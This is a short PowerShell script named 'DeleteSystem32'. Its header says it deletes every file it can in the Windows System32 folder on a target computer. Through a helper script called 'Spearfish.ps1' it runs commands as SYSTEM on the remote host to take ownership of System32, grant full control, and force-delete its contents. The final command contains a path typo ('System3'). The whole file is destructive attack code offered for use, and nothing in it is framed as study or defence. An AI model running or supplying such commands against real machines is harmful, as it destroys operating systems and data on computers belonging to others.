#Name: DeleteSystem32
#Description: Deletes all files possible in the Windows system32 file on the given computer
#Created by: Noah Kulas
#Created date: Oct. 24, 2019

param([string]$Target)

try {
    .\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C takeown /F `"C:\Windows\System32`" /R" -AsSystem $true
    .\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C icacls `"C:\Windows\System32\*`" /Grant SYSTEM:F" -AsSystem $true
    .\Spearfish.ps1 -Target $Target -Action "cmd.exe" -Arguments "/C del `"C:\Windows\System3\*`" /F /S /Q" -AsSystem $true

    return $true
}
catch {
    return $false
}